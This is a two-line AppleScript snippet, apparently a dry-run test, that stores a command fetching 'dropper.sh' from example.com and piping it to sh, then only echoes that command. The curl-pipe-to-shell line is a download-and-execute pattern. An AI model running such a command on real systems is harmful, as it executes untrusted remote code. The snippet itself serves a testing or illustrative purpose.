set suspiciousCmd to "curl -fsSL https://example.com/dropper.sh | sh"
do shell script "echo '[dry-run] would run: " & suspiciousCmd & "'"
